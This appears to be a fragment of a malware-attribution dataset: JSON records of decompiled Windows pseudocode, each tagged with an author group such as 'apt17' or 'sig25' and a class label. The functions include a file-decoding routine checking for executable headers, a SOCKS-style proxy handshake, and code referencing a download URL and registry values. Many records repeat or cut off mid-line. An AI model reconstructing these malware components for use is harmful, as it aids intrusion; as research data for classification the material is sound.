result;\n}\nINT_PTR __stdcall sub_401183(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)\n{\n  HWND v4; // esi\n  HWND v5; // eax\n  HWND v6; // edi\n  LRESULT v7; // eax\n  int i; // edi\n  const CHAR *v9; // eax\n  HWND v10; // eax\n  HWND v11; // esi\n  const char *v12; // eax\n  const CHAR *v13; // eax\n  int v14; // ecx\n  const CHAR *v15; // eax\n  const CHAR *v16; // eax\n  INT_PTR result; // eax\n  const CHAR *v18; // [esp-14h] [ebp-2E28h]\n  CHAR Text[512]; // [esp+0h] [ebp-2E14h] BYREF\n  CHAR PathName[1024]; // [esp+200h] [ebp-2C14h] BYREF\n  CHAR String[1024]; // [esp+600h] [ebp-2814h] BYREF\n  in"}
{"author": "sig25", "label": 3, "inputs": "void __cdecl sub_401000(int *a1, void (__cdecl *a2)(char *, int))\n{\n  int v2; // ebx\n  int *v3; // esi\n  _BYTE *v4; // eax\n  int v5; // ebx\n  int v6; // ebx\n  unsigned int v7; // ebp\n  const void **i; // eax\n  const void *v9; // esi\n  int v10; // ebp\n  int v11; // ebp\n  int v12; // esi\n  int *v13; // esi\n  unsigned int v14; // edx\n  void *v15; // eax\n  int v16; // edx\n  void *v17; // edi\n  const void **v18; // ebx\n  unsigned int v19; // eax\n  const void *v20; // esi\n  char *v21; // eax\n  int v22; // esi\n  char v23; // al\n  int v24; // edx\n  int v25; // ecx\n  unsigned int v26; // ecx\n  unsigned int v27; // eax\n  void *v28; // ebp\n  int *v29; // eax\n  unsigned int v30; // ebp\n  char *j; // eax\n  unsigned int v32; // eax\n  void **v33; // edi\n  int v34; // ebx\n  int v35; // ebx\n  unsigned int v36; // ecx\n  const void *v37; // esi\n  int v38; // ebp\n  int *v39; // eax\n  char *k; // eax\n  const void *v41; // esi\n  char *v42; // edi\n  int v43; // edi\n  void **v44; // esi\n  int v45; // [esp-8h] [ebp-21034h]\n  unsigned int v46; // [esp+Ch] [ebp-21020h]\n  int *v47; // [esp+10h] [ebp-2101Ch]\n  const void **v48; // [esp+14h] [ebp-21018h]\n  int v49; // [esp+18h] [ebp-21014h]\n  int v50; // [esp+1Ch] [ebp-21010h]\n  int v51; // [esp+20h] [ebp-2100Ch]\n  int v52; // [esp+24h] [ebp-21008h]\n  char *v53; // [esp+28h] [ebp-21004h]\n  char v54[4096]; // [esp+2Ch] [ebp-21000h] BYREF\n  int v55[516]; // [esp+102Ch] [ebp-20000h] BYREF\n  char v56; // [esp+183Ch] [ebp-1F7F0h] BYREF\n\n  v2 = 0;\n  v3 = v55;\n  do\n  {\n    *v3 = (int)operator new(1u);\n    v3[1] = 1;\n    v4 = (_BYTE *)*v3;\n    v3 += 2;\n    *v4 = v2++;\n  }\n  while ( v2 < 256 );\n  v55[512] = 0;\n  v55[514] = 0;\n  v5 = *a1;\n  v51 = 9;\n  v6 = v5 & 0x1FF;\n  v49 = 258;\n  v50 = 1;\n  v52 = 1;\n  if ( v6 != 257 )\n  {\n    v7 = v55[2 * v6 + 1];\n    if ( v7 <= 0x1000 )\n    {\n      qmemcpy(v54, (const void *)v55[2 * v6], v7);\n      v46 = v7;\n    }\n    else\n    {\n      qmemcpy(v54, (const void *)v55[2 * v6], sizeof(v54));\n      v46 = 4096;\n      a2(v54, 4096);\n      if ( v7 - 4096 > 0x1000 )\n      {"}
{"author": "sig25", "label": 3, "inputs": "int sub_401000()\n{\n  return CWinApp::messageMap;\n}\nint (**sub_401010())()\n{\n  return &off_403268;\n}\nvoid *__thiscall sub_401040(void *this, char a2)\n{\n  CWinApp::~CWinApp((CWinApp *)this);\n  if ( (a2 & 1) != 0 )\n    operator delete(this);\n  return this;\n}\n// attributes: thunk\nvoid __thiscall CWinApp::~CWinApp(CWinApp *this)\n{\n  ??1CWinApp@@UAE@XZ(this);\n}\nint sub_401070()\n{\n  unknown_libname_1();\n  return atexit(unknown_libname_2);\n}\n// Microsoft VisualC 2-14/net runtime\n_DWORD *unknown_libname_1()\n{\n  CWinApp::CWinApp((CWinApp *)dword_404178, 0);\n  dword_404178[0] = &off_4032A0;\n  return dword_404178;\n}\n// Microsoft VisualC 2-14/net runtime\nvoid __cdecl unknown_libname_2()\n{\n  CWinApp::~CWinApp((CWinApp *)dword_404178);\n}\nvoid __thiscall __noreturn sub_4010D0(_BYTE *this, int a2, int a3)\n{\n  int v4; // edi\n  int v5; // eax\n  int v6; // eax\n  int v7; // eax\n  CHAR *v8; // eax\n  unsigned __int8 *v9; // ecx\n  int v10; // ecx\n  int v11; // [esp-8h] [ebp-14Ch] BYREF\n  unsigned __int8 *v12[4]; // [esp-4h] [ebp-148h] BYREF\n  int v13; // [esp+Ch] [ebp-138h] BYREF\n  char v14[4]; // [esp+10h] [ebp-134h] BYREF\n  unsigned __int8 **v15; // [esp+14h] [ebp-130h] BYREF\n  char v16[4]; // [esp+18h] [ebp-12Ch] BYREF\n  HKEY phkResult; // [esp+1Ch] [ebp-128h] BYREF\n  LPCSTR lpParameters; // [esp+20h] [ebp-124h] BYREF\n  LPCSTR lpFile; // [esp+24h] [ebp-120h] BYREF\n  int *v20; // [esp+28h] [ebp-11Ch]\n  DWORD cbData; // [esp+2Ch] [ebp-118h] BYREF\n  DWORD Type; // [esp+30h] [ebp-114h] BYREF\n  BYTE Data[268]; // [esp+34h] [ebp-110h] BYREF\n  int v24; // [esp+140h] [ebp-4h]\n\n  sub_401670();\n  CString::CString((CString *)&v13, aHttpWorldnewsm);\n  v4 = 0;\n  v24 = 0;\n  v5 = CString::ReverseFind((CString *)&v13, 47);\n  v6 = CString::Mid(&v13, &v15, v5 + 1, *(_DWORD *)(v13 - 8));\n  LOBYTE(v24) = 1;\n  CString::operator=(&v13, v6);\n  LOBYTE(v24) = 0;\n  CString::~CString((CString *)&v15);\n  v7 = CString::ReverseFind((CString *)&v13, 46);\n  v12[0] = (unsigned __int8 *)a1;\n  if ( v7 == -1 )\n  {\n    this[196] = 0;\n    CString::operator+=(&v13, v12[0]"}
{"author": "sig25", "label": 3, "inputs": "INT_PTR __stdcall sub_401010(HWND hDlg, UINT a2, WPARAM a3, LPARAM lpString)\n{\n  INT_PTR result; // eax\n\n  sub_40535C(0, 0, aGetpassword1, lpString);\n  if ( a2 == 272 )\n  {\n    SetDlgItemTextA(hDlg, 102, (LPCSTR)lpString);\n    result = 1;\n  }\n  else if ( a2 == 273 )\n  {\n    if ( (_WORD)a3 == 1 )\n    {\n      GetDlgItemTextA(hDlg, 101, String, 128);\n      EndDialog(hDlg, 1);\n      result = 1;\n    }\n    else if ( (_WORD)a3 == 2 )\n    {\n      EndDialog(hDlg, 0);\n      result = 1;\n    }\n    else\n    {\n      result = 0;\n    }\n  }\n  else\n  {\n    result = 0;\n  }\n  return result;\n}\nINT_PTR __stdcall sub_4010A3(HWND hDlg, UINT a2, WPARAM a3, LPARAM lpString)\n{\n  INT_PTR result; // eax\n  int v5; // [esp-4h] [ebp-10h]\n\n  sub_40535C(0, 0, aAsknextvol, lpString);\n  if ( a2 == 272 )\n  {\n    ::lpString = (LPCSTR)lpString;\n    SetDlgItemTextA(hDlg, 101, (LPCSTR)lpString);\n    result = 1;\n  }\n  else if ( a2 == 273 )\n  {\n    switch ( (_WORD)a3 )\n    {\n      case 1:\n        GetDlgItemTextA(hDlg, 101, (LPSTR)::lpString, 1024);\n        EndDialog(hDlg, 1);\n        result = 1;\n        break;\n      case 2:\n        EndDialog(hDlg, 0);\n        result = 1;\n        break;\n      case 0x66:\n        v5 = sub_405B5C();\n        sub_402930();\n        if ( (unsigned __int8)sub_40541C(v5) )\n          SetDlgItemTextA(hDlg, 101, ::lpString);\n        result = 1;\n        break;\n      default:\n        result = 0;\n        break;\n    }\n  }\n  else\n  {\n    result = 0;\n  }\n  return result;\n}\nINT_PTR __stdcall sub_401183(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)\n{\n  HWND v4; // esi\n  HWND v5; // eax\n  HWND v6; // edi\n  LRESULT v7; // eax\n  int i; // edi\n  const CHAR *v9; // eax\n  HWND v10; // eax\n  HWND v11; // esi\n  const char *v12; // eax\n  const CHAR *v13; // eax\n  int v14; // ecx\n  const CHAR *v15; // eax\n  const CHAR *v16; // eax\n  INT_PTR result; // eax\n  const CHAR *v18; // [esp-14h] [ebp-2E28h]\n  CHAR Text[512]; // [esp+0h] [ebp-2E14h] BYREF\n  CHAR PathName[1024]; // [esp+200h] [ebp-2C14h] BYREF\n  CHAR String[1024]; // [esp+600h] [ebp-2814h] BYREF\n  in"}
{"author": "sig25", "label": 3, "inputs": "INT_PTR __stdcall sub_401010(HWND hDlg, UINT a2, WPARAM a3, LPARAM lpString)\n{\n  INT_PTR result; // eax\n\n  sub_40535C(0, 0, aGetpassword1, lpString);\n  if ( a2 == 272 )\n  {\n    SetDlgItemTextA(hDlg, 102, (LPCSTR)lpString);\n    result = 1;\n  }\n  else if ( a2 == 273 )\n  {\n    if ( (_WORD)a3 == 1 )\n    {\n      GetDlgItemTextA(hDlg, 101, String, 128);\n      EndDialog(hDlg, 1);\n      result = 1;\n    }\n    else if ( (_WORD)a3 == 2 )\n    {\n      EndDialog(hDlg, 0);\n      result = 1;\n    }\n    else\n    {\n      result = 0;\n    }\n  }\n  else\n  {\n    result = 0;\n  }\n  return result;\n}\nINT_PTR __stdcall sub_4010A3(HWND hDlg, UINT a2, WPARAM a3, LPARAM lpString)\n{\n  INT_PTR result; // eax\n  int v5; // [esp-4h] [ebp-10h]\n\n  sub_40535C(0, 0, aAsknextvol, lpString);\n  if ( a2 == 272 )\n  {\n    ::lpString = (LPCSTR)lpString;\n    SetDlgItemTextA(hDlg, 101, (LPCSTR)lpString);\n    result = 1;\n  }\n  else if ( a2 == 273 )\n  {\n    switch ( (_WORD)a3 )\n    {\n      case 1:\n        GetDlgItemTextA(hDlg, 101, (LPSTR)::lpString, 1024);\n        EndDialog(hDlg, 1);\n        result = 1;\n        break;\n      case 2:\n        EndDialog(hDlg, 0);\n        result = 1;\n        break;\n      case 0x66:\n        v5 = sub_405B5C();\n        sub_402930();\n        if ( (unsigned __int8)sub_40541C(v5) )\n          SetDlgItemTextA(hDlg, 101, ::lpString);\n        result = 1;\n        break;\n      default:\n        result = 0;\n        break;\n    }\n  }\n  else\n  {\n    result = 0;\n  }\n  return result;\n}\nINT_PTR __stdcall sub_401183(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)\n{\n  HWND v4; // esi\n  HWND v5; // eax\n  HWND v6; // edi\n  LRESULT v7; // eax\n  int i; // edi\n  const CHAR *v9; // eax\n  HWND v10; // eax\n  HWND v11; // esi\n  const char *v12; // eax\n  const CHAR *v13; // eax\n  int v14; // ecx\n  const CHAR *v15; // eax\n  const CHAR *v16; // eax\n  INT_PTR result; // eax\n  const CHAR *v18; // [esp-14h] [ebp-2E28h]\n  CHAR Text[512]; // [esp+0h] [ebp-2E14h] BYREF\n  CHAR PathName[1024]; // [esp+200h] [ebp-2C14h] BYREF\n  CHAR String[1024]; // [esp+600h] [ebp-2814h] BYREF\n  in"}
{"author": "sig25", "label": 3, "inputs": "INT_PTR __stdcall sub_401010(HWND hDlg, UINT a2, WPARAM a3, LPARAM lpString)\n{\n  INT_PTR result; // eax\n\n  sub_40535C(0, 0, aGetpassword1, lpString);\n  if ( a2 == 272 )\n  {\n    SetDlgItemTextA(hDlg, 102, (LPCSTR)lpString);\n    result = 1;\n  }\n  else if ( a2 == 273 )\n  {\n    if ( (_WORD)a3 == 1 )\n    {\n      GetDlgItemTextA(hDlg, 101, String, 128);\n      EndDialog(hDlg, 1);\n      result = 1;\n    }\n    else if ( (_WORD)a3 == 2 )\n    {\n      EndDialog(hDlg, 0);\n      result = 1;\n    }\n    else\n    {\n      result = 0;\n    }\n  }\n  else\n  {\n    result = 0;\n  }\n  return result;\n}\nINT_PTR __stdcall sub_4010A3(HWND hDlg, UINT a2, WPARAM a3, LPARAM lpString)\n{\n  INT_PTR result; // eax\n  int v5; // [esp-4h] [ebp-10h]\n\n  sub_40535C(0, 0, aAsknextvol, lpString);\n  if ( a2 == 272 )\n  {\n    ::lpString = (LPCSTR)lpString;\n    SetDlgItemTextA(hDlg, 101, (LPCSTR)lpString);\n    result = 1;\n  }\n  else if ( a2 == 273 )\n  {\n    switch ( (_WORD)a3 )\n    {\n      case 1:\n        GetDlgItemTextA(hDlg, 101, (LPSTR)::lpString, 1024);\n        EndDialog(hDlg, 1);\n        result = 1;\n        break;\n      case 2:\n        EndDialog(hDlg, 0);\n        result = 1;\n        break;\n      case 0x66:\n        v5 = sub_405B5C();\n        sub_402930();\n        if ( (unsigned __int8)sub_40541C(v5) )\n          SetDlgItemTextA(hDlg, 101, ::lpString);\n        result = 1;\n        break;\n      default:\n        result = 0;\n        break;\n    }\n  }\n  else\n  {\n    result = 0;\n  }\n  return result;\n}\nINT_PTR __stdcall sub_401183(HWND hWnd, UINT a2, WPARAM a3, LPARAM a4)\n{\n  HWND v4; // esi\n  HWND v5; // eax\n  HWND v6; // edi\n  LRESULT v7; // eax\n  int i; // edi\n  const CHAR *v9; // eax\n  HWND v10; // eax\n  HWND v11; // esi\n  const char *v12; // eax\n  const CHAR *v13; // eax\n  int v14; // ecx\n  const CHAR *v15; // eax\n  const CHAR *v16; // eax\n  INT_PTR result; // eax\n  const CHAR *v18; // [esp-14h] [ebp-2E28h]\n  CHAR Text[512]; // [esp+0h] [ebp-2E14h] BYREF\n  CHAR PathName[1024]; // [esp+200h] [ebp-2C14h] BYREF\n  CHAR String[1024]; // [esp+600h] [ebp-2814h] BYREF\n  in"}
{"author": "apt17", "label": 4, "inputs": "char __cdecl deKernel(LPCSTR lpFileName, int a2)\n{\n  HANDLE v2; // eax\n  void *v3; // esi\n  DWORD v4; // ebx\n  DWORD v5; // esi\n  DWORD v6; // eax\n  char v7; // cl\n  _DWORD *v8; // eax\n  char v10; // [esp+11h] [ebp-437h]\n  char v11; // [esp+12h] [ebp-436h]\n  char v12; // [esp+13h] [ebp-435h]\n  HANDLE hFile; // [esp+14h] [ebp-434h]\n  DWORD NumberOfBytesRead; // [esp+28h] [ebp-420h] BYREF\n  DWORD v15; // [esp+2Ch] [ebp-41Ch]\n  unsigned int v16; // [esp+30h] [ebp-418h]\n  DWORD NumberOfBytesWritten; // [esp+34h] [ebp-414h]\n  char v18[16]; // [esp+38h] [ebp-410h] BYREF\n  char Buffer; // [esp+48h] [ebp-400h] BYREF\n  char v20[1020]; // [esp+49h] [ebp-3FFh] BYREF\n  __int16 v21; // [esp+445h] [ebp-3h]\n  char v22; // [esp+447h] [ebp-1h]\n\n  v2 = CreateFileA(lpFileName, 0xC0000000, 0, 0, 3u, 0x80u, 0);\n  v3 = v2;\n  hFile = v2;\n  if ( v2 != (HANDLE)-1 )\n  {\n    v4 = GetFileSize(v2, 0);\n    Buffer = 0;\n    NumberOfBytesRead = 0;\n    memset(v20, 0, sizeof(v20));\n    v21 = 0;\n    NumberOfBytesWritten = 0;\n    v22 = 0;\n    v15 = v4;\n    v16 = strlen((const char *)a2);\n    if ( v4 )\n    {\n      while ( ReadFile(v3, &Buffer, 0x400u, &NumberOfBytesRead, 0) )\n      {\n        v5 = NumberOfBytesRead;\n        v6 = 0;\n        if ( NumberOfBytesRead )\n        {\n          v7 = *(_BYTE *)a2;\n          v11 = *(_BYTE *)(a2 + 1);\n          v12 = *(_BYTE *)(a2 + 2);\n          v10 = *(_BYTE *)(a2 + 3);\n          do\n          {\n            *(&Buffer + v6) = v16 ^ (v10 + (v12 ^ ((v7 ^ *(&Buffer + v6)) - v11)));\n            ++v6;\n          }\n          while ( v6 < v5 );\n          v4 = v15;\n        }\n        v18[0] = v10;\n        std::string::_Tidy(0);\n        sub_4012D0(&Buffer, v5);\n        sub_401500(0, 1, v18);\n        std::string::_Tidy(1);\n        v3 = hFile;\n        v4 -= NumberOfBytesRead;\n        v15 = v4;\n        if ( !v4 )\n          goto LABEL_9;\n      }\n      goto LABEL_14;\n    }\nLABEL_9:\n    v8 = (_DWORD *)MEMORY[4];\n    if ( !MEMORY[4] )\n      v8 = &unk_40B170;\n    if ( *(_WORD *)v8 == 23117 && *(_DWORD *)((char *)v8 + v8[15]) == 17744"}
{"author": "apt17", "label": 4, "inputs": "void __thiscall sub_54501000(_BYTE *this)\n{\n  int v2; // esi\n  void *v3; // edi\n  int v4; // esi\n  CHAR *v5; // ebx\n  CHAR *v6; // eax\n  int v7; // ebp\n  CHAR v8; // cl\n  CHAR *lpSrcStr; // [esp+70h] [ebp-4h]\n\n  if ( dword_54627EBC() == 950 )\n  {\n    v2 = dword_54627EB0(950, 0, this, -1, 0, 0);\n    v3 = operator new(2 * v2 + 2);\n    dword_54627EB0(950, 0, this, -1, v3, v2);\n    v4 = dword_54627EB4(936, 0, v3, -1, 0, 0, 0, 0);\n    lpSrcStr = (CHAR *)operator new(v4 + 1);\n    v5 = (CHAR *)operator new(v4 + 1);\n    dword_54627EB4(936, 0, v3, -1, lpSrcStr, v4, 0, 0);\n    LCMapStringA(0x804u, 0x2000000u, lpSrcStr, -1, v5, v4);\n    v6 = v5;\n    v7 = this - v5;\n    do\n    {\n      v8 = *v6;\n      v6[v7] = *v6;\n      ++v6;\n    }\n    while ( v8 );\n    j__free(v3);\n    j__free(lpSrcStr);\n    j__free(v5);\n  }\n}\nvoid __thiscall sub_545010E0(LPCSTR lpSrcStr)\n{\n  int v2; // edi\n  WCHAR *v3; // esi\n  int v4; // ebp\n  CHAR *v5; // edi\n  char *v6; // eax\n  const CHAR *v7; // ebx\n  char v8; // cl\n  CHAR *Block; // [esp+4h] [ebp-4h]\n\n  if ( dword_54627EBC() == 950 )\n  {\n    v2 = MultiByteToWideChar(0x3A8u, 0, lpSrcStr, -1, 0, 0);\n    Block = (CHAR *)operator new(2 * v2 + 1);\n    LCMapStringA(0x804u, 0x4000000u, lpSrcStr, -1, Block, 2 * v2);\n    v3 = (WCHAR *)operator new(2 * v2 + 2);\n    MultiByteToWideChar(0x3A8u, 0, Block, -1, v3, v2);\n    v4 = WideCharToMultiByte(0x3B6u, 0, v3, -1, 0, 0, 0, 0);\n    v5 = (CHAR *)operator new(v4 + 1);\n    WideCharToMultiByte(0x3B6u, 0, v3, -1, v5, v4, 0, 0);\n    v6 = v5;\n    v7 = (const CHAR *)(lpSrcStr - v5);\n    do\n    {\n      v8 = *v6;\n      v6[(_DWORD)v7] = *v6;\n      ++v6;\n    }\n    while ( v8 );\n    j__free(v3);\n    j__free(Block);\n    j__free(v5);\n  }\n}\nchar __cdecl sub_545011D0(int a1, int a2)\n{\n  int v2; // eax\n  int v4; // edx\n  int v5; // ecx\n  int v6; // eax\n  int v7; // edx\n  int v8; // eax\n  int v9; // ecx\n  int v10; // edx\n  int v11[11]; // [esp+Ch] [ebp-140h] BYREF\n  char v12[276]; // [esp+38h] [ebp-114h] BYREF\n\n  v2 = dword_54627E54(a1, v11);\n  if ( v2 == -1 )\n    return 0;\n  dword"}
{"author": "apt17", "label": 4, "inputs": "_WORD *__thiscall sub_32001000(_WORD *this, int a2, __int16 a3, int a4)\n{\n  _WORD *result; // eax\n\n  result = this;\n  this[8] = a3;\n  *((_DWORD *)this + 5) = a4;\n  *((_BYTE *)this + 5) = 0;\n  *((_BYTE *)this + 4) = 0;\n  *((_DWORD *)this + 8) = 0;\n  *((_DWORD *)this + 3) = 0;\n  *(_DWORD *)this = a2;\n  *((_DWORD *)this + 2) = 0;\n  return result;\n}\n__int16 __thiscall sub_3200102C(_WORD *this)\n{\n  return this[8];\n}\nint __thiscall sub_32001031(_DWORD *this)\n{\n  return this[5];\n}\nint __thiscall sub_32001035(_DWORD *this)\n{\n  return this[3];\n}\nint __thiscall sub_32001039(_DWORD *this)\n{\n  return this[8];\n}\nint __thiscall sub_3200103D(_DWORD *this, int a2)\n{\n  int result; // eax\n\n  result = a2;\n  this[3] = a2;\n  return result;\n}\nint __thiscall sub_32001047(_DWORD *this, int a2)\n{\n  int result; // eax\n\n  result = a2;\n  this[2] = a2;\n  return result;\n}\nint __thiscall sub_32001051(int this)\n{\n  int result; // eax\n  __int16 v3; // ax\n  char v4[8]; // [esp+4h] [ebp-8h] BYREF\n\n  result = sub_32001035((_DWORD *)this);\n  if ( result != 4 )\n  {\n    v3 = *(_WORD *)(this + 16);\n    *(_WORD *)&v4[3] = -1;\n    *(_WORD *)&v4[1] = v3;\n    v4[0] = -117;\n    result = sub_320015D3((int)v4, 5u);\n  }\n  return result;\n}\nint __thiscall sub_32001085(int this, int a2, _DWORD *a3)\n{\n  if ( *(_BYTE *)(this + 5) != 1 )\n  {\n    if ( *(_BYTE *)(this + 4) != 0xC1 )\n      return 0;\n    if ( *(_BYTE *)a2 != 5 || *(_BYTE *)(a2 + 1) || *(_BYTE *)(a2 + 2) || *(_BYTE *)(a2 + 3) != 1 )\n    {\nLABEL_9:\n      *(_BYTE *)(this + 4) = -1;\n      return 0;\n    }\n    if ( *a3 == 10 )\n    {\n      *(_DWORD *)(this + 24) = *(_DWORD *)(a2 + 4);\n      *(_WORD *)(this + 28) = ntohs(*(_WORD *)(a2 + 8));\n      *(_BYTE *)(this + 5) = 1;\n      goto LABEL_9;\n    }\n  }\n  return -1;\n}\nBOOL __thiscall sub_320010E0(LPVOID lpParameter, int a2, int len)\n{\n  unsigned __int8 v4; // al\n  bool v5; // zf\n  char v6; // al\n  int v7; // eax\n  int v9; // eax\n\n  v4 = *((_BYTE *)lpParameter + 4);\n  if ( v4 < 0xB0u )\n  {\n    switch ( v4 )\n    {\n      case 0u:\n        if ( *(_BYTE *)a2 == 5 && l"}
{"author": "apt17", "label": 4, "inputs": "void __thiscall sub_10001000(_BYTE *this)\n{\n  int v2; // esi\n  void *v3; // edi\n  int v4; // esi\n  CHAR *v5; // ebx\n  CHAR *v6; // eax\n  int v7; // ebp\n  CHAR v8; // cl\n  CHAR *lpSrcStr; // [esp+70h] [ebp-4h]\n\n  if ( dword_10128F14() == 950 )\n  {\n    v2 = dword_10128F08(950, 0, this, -1, 0, 0);\n    v3 = operator new(2 * v2 + 2);\n    dword_10128F08(950, 0, this, -1, v3, v2);\n    v4 = dword_10128F0C(936, 0, v3, -1, 0, 0, 0, 0);\n    lpSrcStr = (CHAR *)operator new(v4 + 1);\n    v5 = (CHAR *)operator new(v4 + 1);\n    dword_10128F0C(936, 0, v3, -1, lpSrcStr, v4, 0, 0);\n    LCMapStringA(0x804u, 0x2000000u, lpSrcStr, -1, v5, v4);\n    v6 = v5;\n    v7 = this - v5;\n    do\n    {\n      v8 = *v6;\n      v6[v7] = *v6;\n      ++v6;\n    }\n    while ( v8 );\n    j__free(v3);\n    j__free(lpSrcStr);\n    j__free(v5);\n  }\n}\nvoid __thiscall sub_100010E0(LPCSTR lpSrcStr)\n{\n  int v2; // edi\n  WCHAR *v3; // esi\n  int v4; // ebp\n  CHAR *v5; // edi\n  char *v6; // eax\n  const CHAR *v7; // ebx\n  char v8; // cl\n  CHAR *Block; // [esp+4h] [ebp-4h]\n\n  if ( dword_10128F14() == 950 )\n  {\n    v2 = MultiByteToWideChar(0x3A8u, 0, lpSrcStr, -1, 0, 0);\n    Block = (CHAR *)operator new(2 * v2 + 1);\n    LCMapStringA(0x804u, 0x4000000u, lpSrcStr, -1, Block, 2 * v2);\n    v3 = (WCHAR *)operator new(2 * v2 + 2);\n    MultiByteToWideChar(0x3A8u, 0, Block, -1, v3, v2);\n    v4 = WideCharToMultiByte(0x3B6u, 0, v3, -1, 0, 0, 0, 0);\n    v5 = (CHAR *)operator new(v4 + 1);\n    WideCharToMultiByte(0x3B6u, 0, v3, -1, v5, v4, 0, 0);\n    v6 = v5;\n    v7 = (const CHAR *)(lpSrcStr - v5);\n    do\n    {\n      v8 = *v6;\n      v6[(_DWORD)v7] = *v6;\n      ++v6;\n    }\n    while ( v8 );\n    j__free(v3);\n    j__free(Block);\n    j__free(v5);\n  }\n}\nchar __cdecl sub_100011D0(int a1, int a2)\n{\n  int v2; // eax\n  int v4; // edx\n  int v5; // ecx\n  int v6; // eax\n  int v7; // edx\n  int v8; // eax\n  int v9; // ecx\n  int v10; // edx\n  int v11[11]; // [esp+Ch] [ebp-140h] BYREF\n  char v12[276]; // [esp+38h] [ebp-114h] BYREF\n\n  v2 = dword_10128EAC(a1, v11);\n  if ( v2 == -1 )\n    return 0;\n  dword"}
{"author": "apt17", "label": 4, "inputs": "_WORD *__thiscall sub_32001000(_WORD *this, int a2, __int16 a3, int a4)\n{\n  _WORD *result; // eax\n\n  result = this;\n  this[8] = a3;\n  *((_DWORD *)this + 5) = a4;\n  *((_BYTE *)this + 5) = 0;\n  *((_BYTE *)this + 4) = 0;\n  *((_DWORD *)this + 8) = 0;\n  *((_DWORD *)this + 3) = 0;\n  *(_DWORD *)this = a2;\n  *((_DWORD *)this + 2) = 0;\n  return result;\n}\n__int16 __thiscall sub_3200102C(_WORD *this)\n{\n  return this[8];\n}\nint __thiscall sub_32001031(_DWORD *this)\n{\n  return this[5];\n}\nint __thiscall sub_32001035(_DWORD *this)\n{\n  return this[3];\n}\nint __thiscall sub_32001039(_DWORD *this)\n{\n  return this[8];\n}\nint __thiscall sub_3200103D(_DWORD *this, int a2)\n{\n  int result; // eax\n\n  result = a2;\n  this[3] = a2;\n  return result;\n}\nint __thiscall sub_32001047(_DWORD *this, int a2)\n{\n  int result; // eax\n\n  result = a2;\n  this[2] = a2;\n  return result;\n}\nint __thiscall sub_32001051(int this)\n{\n  int result; // eax\n  __int16 v3; // ax\n  char v4[8]; // [esp+4h] [ebp-8h] BYREF\n\n  result = sub_32001035((_DWORD *)this);\n  if ( result != 4 )\n  {\n    v3 = *(_WORD *)(this + 16);\n    *(_WORD *)&v4[3] = -1;\n    *(_WORD *)&v4[1] = v3;\n    v4[0] = -117;\n    result = sub_320015D3((int)v4, 5u);\n  }\n  return result;\n}\nint __thiscall sub_32001085(int this, int a2, _DWORD *a3)\n{\n  if ( *(_BYTE *)(this + 5) != 1 )\n  {\n    if ( *(_BYTE *)(this + 4) != 0xC1 )\n      return 0;\n    if ( *(_BYTE *)a2 != 5 || *(_BYTE *)(a2 + 1) || *(_BYTE *)(a2 + 2) || *(_BYTE *)(a2 + 3) != 1 )\n    {\nLABEL_9:\n      *(_BYTE *)(this + 4) = -1;\n      return 0;\n    }\n    if ( *a3 == 10 )\n    {\n      *(_DWORD *)(this + 24) = *(_DWORD *)(a2 + 4);\n      *(_WORD *)(this + 28) = ntohs(*(_WORD *)(a2 + 8));\n      *(_BYTE *)(this + 5) = 1;\n      goto LABEL_9;\n    }\n  }\n  return -1;\n}\nBOOL __thiscall sub_320010E0(LPVOID lpParameter, int a2, int len)\n{\n  unsigned __int8 v4; // al\n  bool v5; // zf\n  char v6; // al\n  int v7; // eax\n  int v9; // eax\n\n  v4 = *((_BYTE *)lpParameter + 4);\n  if ( v4 < 0xB0u )\n  {\n    switch ( v4 )\n    {\n      case 0u:\n        if ( *(_BYTE *)a2 == 5 && l"}
{"author": "apt17", "label": 4, "inputs": "int __usercall sub_401000@<eax>(__int64 a1@<edx:eax>, unsigned __int8 a2@<cl>)\n{\n  if ( a2 >= 0x40u )\n  {\n    LODWORD(a1) = SHIDWORD(a1) >> 31;\n  }\n  else if ( a2 >= 0x20u )\n  {\n    LODWORD(a1) = SHIDWORD(a1) >> (a2 & 0x1F);\n  }\n  else\n  {\n    a1 >>= a2 & 0x1F;\n  }\n  return a1;\n}\nunsigned __int64 __stdcall sub_401030(__int64 a1, __int64 a2)\n{\n  unsigned __int64 result; // rax\n\n  if ( HIDWORD(a1) | HIDWORD(a2) )\n    result = a1 * a2;\n  else\n    result = (unsigned int)a2 * (unsigned __int64)(unsigned int)a1;\n  return result;\n}\nint __stdcall sub_401120(unsigned __int64 a1, __int64 a2)\n{\n  int v2; // edi\n  int v3; // eax\n  unsigned __int64 v4; // rtt\n  int v5; // esi\n  unsigned __int64 v6; // rcx\n  unsigned __int64 v7; // rax\n  unsigned __int64 v8; // rax\n  int result; // eax\n\n  v2 = 0;\n  if ( (a1 & 0x8000000000000000ui64) != 0i64 )\n  {\n    v2 = 1;\n    HIDWORD(a1) = -HIDWORD(a1) - ((_DWORD)a1 != 0);\n    LODWORD(a1) = -(int)a1;\n  }\n  v3 = HIDWORD(a2);\n  if ( a2 < 0 )\n  {\n    ++v2;\n    v3 = -HIDWORD(a2) - ((_DWORD)a2 != 0);\n    HIDWORD(a2) = v3;\n    LODWORD(a2) = -(int)a2;\n  }\n  if ( v3 )\n  {\n    v6 = __PAIR64__(v3, a2);\n    v7 = a1;\n    do\n    {\n      v6 >>= 1;\n      v7 >>= 1;\n    }\n    while ( HIDWORD(v6) );\n    v5 = v7 / (unsigned int)v6;\n    v8 = (unsigned int)v5 * (unsigned __int64)(unsigned int)a2;\n    if ( __CFADD__(HIDWORD(a2) * v5, HIDWORD(v8))\n      || (HIDWORD(v8) = (a2 * (unsigned __int64)(unsigned int)v5) >> 32, v8 > a1) )\n    {\n      --v5;\n    }\n  }\n  else\n  {\n    LODWORD(v4) = a1;\n    HIDWORD(v4) = HIDWORD(a1) % (unsigned int)a2;\n    v5 = v4 / (unsigned int)a2;\n  }\n  result = v5;\n  if ( v2 == 1 )\n    result = -v5;\n  return result;\n}\nvoid *__usercall _alloca_probe@<eax>(unsigned int a1@<eax>, int a2@<ecx>)\n{\n  unsigned int v2; // ecx\n  unsigned int i; // eax\n  int v5; // [esp-4h] [ebp-4h] BYREF\n  void *retaddr; // [esp+0h] [ebp+0h] BYREF\n\n  v5 = a2;\n  v2 = ~((unsigned int)((unsigned int)&retaddr - (unsigned __int64)a1) >> 32) & ((unsigned int)&retaddr - a1);\n  for ( i = (unsigned int)&v5 & 0xFFFFF000; v2 "}
